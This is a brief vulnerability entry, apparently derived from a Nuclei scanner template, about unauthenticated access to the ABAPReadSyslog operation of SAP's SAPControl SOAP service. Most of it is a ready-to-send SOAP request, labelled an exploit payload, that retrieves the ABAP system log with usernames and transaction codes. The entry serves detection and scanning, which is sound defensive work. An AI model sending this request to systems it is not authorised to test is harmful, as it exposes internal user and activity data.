# Vulnerability: SAPControl ABAPReadSyslog - Disclosure
**Classification:** MISCONFIG
**Source:** Nuclei Template (`sap-abapreadsyslog-disclosure.yaml`)

## Description
Detected SAP systems where the SAPControl SOAP web service exposes the ABAPReadSyslog operation without authentication. ABAPReadSyslog returns the ABAP system log (equivalent to transaction SM21) via SAPControl sapstartsrv and includes fields such as client, username, transaction code, message number, free-text message and severity.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
SOAPAction: '""'

<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
      <enableSession>true</enableSession>
    </sapsess:Session>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns1:ABAPReadSyslog xmlns:ns1="urn:SAPControl"></ns1:ABAPReadSyslog>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

